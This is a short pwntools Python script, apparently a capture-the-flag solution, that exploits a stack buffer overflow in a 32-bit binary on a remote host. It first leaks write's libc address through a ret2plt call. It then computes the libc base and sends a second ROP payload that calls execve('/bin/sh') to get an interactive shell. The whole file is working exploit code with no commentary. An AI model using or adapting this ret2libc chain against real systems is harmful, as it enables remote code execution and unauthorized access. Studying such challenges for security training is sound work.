from pwn import *
import time
elf = ELF("./chall")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('220.249.52.134',43656)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

pause()
write_plt=0x80483c0
write_got=0x804a010
restart=0x80484BE
payload="A"*0x70
payload+=p32(write_plt)+p32(restart)+p32(1)+p32(write_got)+p32(4)
sa("2015~!\n",payload)
libc_leak=u32(target.recv(4))
libc_base=libc_leak-libc.sym["write"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
libc_execve=libc_base+libc.sym["execve"]
print("[+] Libc_leak="+hex(libc_leak))
print("[+] Libc_base="+hex(libc_base))
payload="A"*0x70
payload+=p32(libc_execve)+p32(0xdeadbeef)+p32(libc_binsh)+p32(0)+p32(0)
sa("2015~!\n",payload)
target.interactive()
